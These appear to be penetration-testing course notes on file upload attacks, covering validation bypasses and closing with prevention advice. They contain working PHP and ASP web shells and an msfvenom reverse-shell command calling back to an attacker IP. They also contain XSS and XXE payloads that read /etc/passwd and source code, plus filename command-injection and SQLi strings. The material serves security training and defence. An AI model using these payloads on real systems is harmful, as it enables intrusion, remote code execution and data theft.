# File Upload Attacks

## Intro to File Upload Attacks

### Types of File Upload Attacks

Unauthenticated arbitrary file upload (any file type, no auth needed) is the worst case and usually leads to RCE via a web shell or reverse shell. Even limited uploads (specific types only) can enable XSS, XXE, DoS, or file overwrites.

## Absent Validation

No validation filter on uploads lets any file type through, including executable scripts.

### Identifying Web Framework

Web shells must match the server's language. Find it by visiting `/index.<ext>` for common extensions (php, asp, aspx) or fuzzing with Burp Intruder using a Web Extensions wordlist. Wappalyzer browser extension also IDs the stack.

### Vulnerability Identification

Upload a basic test file in the detected language to confirm code execution before exploiting further.

```php
<?php echo "Hello HTB";?>
```

If the output renders instead of raw source, the server executes the uploaded file.

## Upload Exploitation

Upload a web shell or reverse shell in the server's language to gain code execution after confirming arbitrary upload.

### Web Shells

phpbash gives a semi-interactive terminal-like PHP web shell. SecLists has web shells for many languages (Web-Shells directory).

### Writing Custom Web Shell

Minimal web shell executing commands via a GET parameter.

```php
<?php system($_REQUEST['cmd']); ?>
```

Call with `?cmd=id`. View via browser source (CTRL+U) to avoid HTML-rendered output.

```vbscript
<% eval request('cmd') %>
```

.NET equivalent, same `?cmd=` usage. May fail if `system()` is disabled or a WAF blocks it.

### Reverse Shell

pentestmonkey PHP reverse shell (or any SecLists reverse shell script) connects back to a listener after upload. Edit the IP/port in the script, then catch with:

```bash
nc -lvnp <PORT>
```

Reverse shells are preferred over web shells but may fail if outbound traffic is blocked or needed functions are disabled.

### Generating Custom Reverse Shell Scripts

msfvenom generates reverse shell payloads in many languages.

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > reverse.php
```

`-p` payload | `-f` output format

Upload the generated script and catch with the same listener.

## Client-Side Validation

Front-end-only type checks are bypassed by sending requests directly or editing client-side code. No refresh or new request after picking a bad file signals client-side-only validation.

### Back-end Request Modification

Capture the upload request in Burp and change the filename (e.g. `shell.php`) and body content to a web shell, bypassing front-end-only checks.

### Disabling Front-end Validation

Inspect element (CTRL+SHIFT+C) on the upload input to find the validation attributes, then use console (CTRL+SHIFT+K) to view the handler function.

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Delete the `onchange="checkFile(this)"` attribute (and `accept=...` if needed) in the inspector to disable client-side extension checking, then upload the shell normally. Change is temporary and resets on refresh.

## Blacklist Filters

Back-end denies specific extensions; incomplete lists let disallowed types execute via unlisted extensions.

### Blacklisting Extensions

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');
if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Comparison is often case-sensitive and lowercase-only. On Windows, mixed case (e.g. `pHp`) can bypass it and still execute.

### Fuzzing Extensions

Fuzz the upload extension with PayloadsAllTheThings' PHP/.NET extension lists or SecLists' Web Extensions wordlist. In Burp Intruder, set the extension as the payload position, disable URL-encoding of `.`, and compare response length/message to find extensions not blocked.

### Non-Blacklisted Extensions

`.phtml` often still executes as PHP on many servers and is commonly missed by blacklists.

## Whitelist Filters

Only listed extensions pass. More secure than blacklisting but still bypassable through regex flaws.

### Whitelisting Extensions

Checks if the filename contains an allowed extension anywhere, not that it ends with it.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

### Double Extensions

Add a whitelisted extension before the real one, e.g. `shell.jpg.php`, to pass a non-anchored regex while still executing as PHP. A strict pattern anchored with `$` blocks this:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

### Reverse Double Extension

Apache's handler regex can also lack an end anchor, so a name like `shell.php.jpg` passes a strict filename whitelist (ends in `.jpg`) but still matches the handler and executes as PHP.

```text
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Config typically at `/etc/apache2/mods-enabled/php7.4.conf`.

### Character Injection

Inject characters before/after the extension to make the server misinterpret the filename while the whitelist still matches.

Characters to try: `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`

`shell.php%00.jpg` truncates at the null byte on PHP <= 5.x, saving as `shell.php`. On Windows, a colon before the extension (`shell.aspx:.jpg`) saves as `shell.aspx`.

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## Type Filters

Validates file content instead of name, via Content-Type header or MIME magic bytes, usually limited to one category.

### Content-Type

Server checks the browser-set `Content-Type` header of the uploaded file, attacker-controlled and easy to change in Burp.

```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Fuzz allowed types with a SecLists content-type list filtered to the expected category:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

A multipart upload request has two `Content-Type` headers, one for the whole request and one for the file part. Usually the file part's header needs changing.

### MIME-Type

Server reads the file's magic bytes (first few bytes) via `mime_content_type()` instead of trusting the extension or header.

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Prepend `GIF8` (GIF magic bytes, printable ASCII, easiest to fake) as the first line of the PHP shell, keep the `.php` extension. Output then starts with `GIF8` before the command result. Combine Content-Type + MIME filters for extra bypass attempts: allowed MIME with disallowed Content-Type/extension or vice versa.

## Limited File Uploads

Even with strict extension/content filters, allowed types like SVG, HTML, XML, images, or docs can enable other attacks.

### XSS

HTML file uploads allow stored XSS/CSRF via embedded JavaScript when viewed. Image metadata fields (e.g. Comment) displayed back to users can carry XSS too:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

SVG is XML-based and can embed a `<script>` tag that runs when the image renders:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Changing an image's MIME type to `text/html` can make some apps render it as HTML, triggering the payload even without displayed metadata.

### XXE

SVG and other XML-based uploads (PDF, Word, PowerPoint) can carry XXE if the viewer parses XML insecurely.

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Read PHP source with the filter wrapper:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Decode the base64 output to read source. Source access can reveal the upload directory, allowed extensions, and naming scheme. XXE here can also lead to SSRF (enumerate internal services, call internal APIs).

### DoS

Decompression bomb: nested ZIP archives if the app auto-extracts uploads, expanding to huge sizes.

Pixel flood: a small JPG/PNG (e.g. 500x500) with compression metadata manually edited to claim a size of 0xffff x 0xffff (~4 gigapixels), crashing the server on render/allocation.

Uploading an oversized file can fill disk if size isn't limited. Path traversal in the upload path (e.g. `../../../etc/passwd`) can also crash or overwrite files. XXE payloads can cause DoS as well.

## Other Upload Attacks

Extra techniques for exploiting upload forms or server behavior when content filters can't be bypassed directly.

### Injections in File Name

If the filename is passed to an OS command, JS display, or SQL query unsanitized, injecting into it can lead to command injection, XSS, or SQLi.

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

Command injection via filename used in an OS command (e.g. `mv`).

```text
<script>alert(window.origin);</script>
```

XSS if the filename is reflected on a page.

```text
file';select+sleep(5);--.jpg
```

SQLi if the filename is used in a query.

### Upload Directory Disclosure

When the upload path isn't known, fuzz for it, or use LFI/XXE to read source and find the path, naming scheme, and allowed extensions.

Forcing an error can also leak the path: upload a file with a name that already exists, send two identical upload requests simultaneously, or use an overly long filename (~5000 chars).

### Windows-specific Attacks

Reserved characters (`|`, `<`, `>`, `*`, `?`) in an unsanitized/unquoted filename can reference another file and error out, disclosing the upload path. Reserved names (`CON`, `COM1`, `LPT1`, `NUL`) also cause write errors.

8.3 short filenames let a tilde-numbered name reference or overwrite an existing file, e.g. `WEB~1.CON` can overwrite `web.conf`.

### Advanced File Upload Attacks

Any automatic post-upload processing (video encoding, compression, renaming) can be vulnerable if the library is insecure, e.g. AVI upload leading to XXE in ffmpeg.

## Preventing File Upload Vulnerabilities

Checklist for securely validating and handling uploads, and recommendations to report after testing.

### Extension Validation

Whitelist allowed extensions and blacklist dangerous ones together for defense in depth. Apply validation on both front-end and back-end.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
// blacklist test
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}
// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

### Content Validation

Validate extension, Content-Type header, and MIME type together so they must all match the expected file type.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}
// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

### Upload Disclosure

Hide the uploads directory, serve files only through a controlled download script with authorization and path checks (prevents IDOR/LFI), and return 403 for direct requests to the uploads directory.

`Content-Disposition: attachment` forces download instead of inline render | `Content-Type` sets correct MIME | `X-Content-Type-Options: nosniff` stops MIME sniffing

Randomize stored filenames and keep the original name in a database, so users never see the real name or path. Store uploads on a separate server/container to limit blast radius, and restrict file access with `open_basedir`.

### Further Security

Set `disable_functions` in `php.ini` to disable dangerous functions like `exec`, `shell_exec`, `system`, `passthru`. Disable verbose system/server error output.

- Limit file size
- Keep libraries updated
- Scan uploads for malware
- Use a WAF as a secondary layer